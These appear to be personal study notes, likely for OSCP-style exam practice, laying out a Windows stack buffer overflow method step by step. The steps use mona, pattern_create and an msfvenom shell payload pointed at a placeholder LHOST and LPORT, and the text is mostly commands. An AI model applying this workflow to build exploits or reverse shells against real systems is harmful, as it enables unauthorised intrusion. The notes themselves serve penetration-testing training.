0. Set working dir for mona
	!mona config -set workingfolder c:\mona\%p
1. fuzzing
	Find the length of string to crash the application
2. EIP Offset
	2.1 Use the command to generate a unique string to finf EIP offset	
		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [$SIZE]
	2.2 python2 exploit.py with the Above generated string as payload
	2.3 Check the offset using the mona cmd and add it to exploit		
		!mona findmsp -distance [$SIZE]
3. Finding Bad Characters
	3.1 Genrate byte array without "\x00"
		!mona bytearray -b "\x00"
	3.2 Add the generated byte code as string as payload in exploit and run it
	3.3 check the char present after ESP
		!mona compare -f C:\mona\oscp\bytearray.bin -a [$ESP ADDRESS]
		The chars show are possible bad chars
	3.4 Repeat step 3
		by adding the next char from mona's output till we get the same set
			of bad chars.
4. Finding a Jump Point
	4.1 !mona jmp -r esp -cpb "[$BAD CHARS]"
	4.2 Add the JMP ESP address to retn in exploit n reverse order(Little Endian)
		Eg :- \x0a\x0b -> \x0b\x0a
5. Genrate Payload
	5.1 msfvenom -p os/shell_type LHOST=$IP LPORT=$PORT EXITFUNC=thread -b "[$BAD CHARS]" -f output_type
	5.2 Add it to payload in exploit
6. Adding NOPs
	6.1 Add "\x90" to Padding in exploit
		padding = "\x90" * 16
		
		
